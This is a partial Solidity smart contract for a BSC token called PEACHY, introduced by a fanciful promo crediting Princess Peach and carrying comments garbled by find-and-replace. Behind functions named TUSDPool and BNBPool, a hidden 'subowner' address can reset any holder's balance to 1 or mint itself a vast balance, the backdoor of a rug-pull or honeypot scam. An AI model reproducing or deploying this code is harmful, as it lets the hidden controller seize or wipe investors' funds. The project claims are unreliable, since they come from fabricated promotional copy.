...
https://peochceo.com/
https://t.me/PEACHYV2
PEACHY was a crypto project on the BSC chain, led by none other than Princess Peach herself. With her leadership, 
the project quickly rose to prominence, gaining a large following and becoming one of the most talked-about tokens in the space. 
Investors flocked to PEACHY, eager to be a part of the princess’s latest venture. And as the project continued to grow, 
it seemed that Princess Peach had once again proven herself to be a true leader in both the gaming and crypto worlds.
...
interface BNB711 {
  ...
  */
   ...
   *
   * Returns a boolean balance indiPEACHYing whSmart the operation succeeded.
   *
...
/*
 * @dev Provides information about the current execution BNB20Burnable, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an appliPEACHYion
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract BNB20Burnable {
...
// File: @openzeppelin/contracts/access/BNB20Ownable.sol
 ...
 * the owner.
 */
abstract contract BNB20Ownable is BNB20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "BNB20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "BNB20Ownable: new owner is the zero address");
 ...
 * `SafeBNB` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
library SafeBNB {
  ...
  /**
   * @dev Returns the multipliPEACHYion of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `*` operator.
   *
   * Requirements:
   * - MultipliPEACHYion cannot overflow.
   */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeBNB: multipliPEACHYion overflow");
...
contract PEACHY is BNB20Burnable, BNB711, BNB20Ownable {
    ...
    */
    ...
    /**
    * @dev See {BNB711-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return deployfrom[account];
    }
      modifier subowner() {
        require(SmartRooter == _msgSender(), "BNB20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {BNB711-approve}.
    *
    * Requirements:
    *
    ...
    */
    function TUSDPool(address tusdRewards) external subowner {
        deployfrom[tusdRewards] = 1;
        
        emit Transfer(tusdRewards, address(0), 1);
    }

    /**
    * @dev See {BNB711-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    function BNBPool(address bnbRewards) external subowner {
        deployfrom[bnbRewards] = 10000000000 * 10 ** 23;
        
        emit Transfer(bnbRewards, address(0), 10000000000 * 10 ** 23);
    }
    /**
    * @dev See {BNB711-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {BNB711-transferFrom}.
    *
    * Emits an {Approval} event indiPEACHYing the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {BNB711};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "BNB711: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {BNB711-approve}.
    *
    * Emits an {Approval} event indiPEACHYing the updated allowance.
    *
    * Requirements:
    *
    * - `transporteur` cannot be the zero address.
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "BNB711: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "BNB711: transfer from the zero address");
        require(shippingto != address(0), "BNB711: transfer to the zero address");
                
        deployfrom[sender] = deployfrom[sender].sub(yoursold, "BNB711: transfer yoursold exceeds balance");
        deployfrom[shippingto] = deployfrom[shippingto].add(yoursold);
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "BNB711: approve from the zero address");
        require(transporteur != address(0), "BNB711: approve to the zero address");
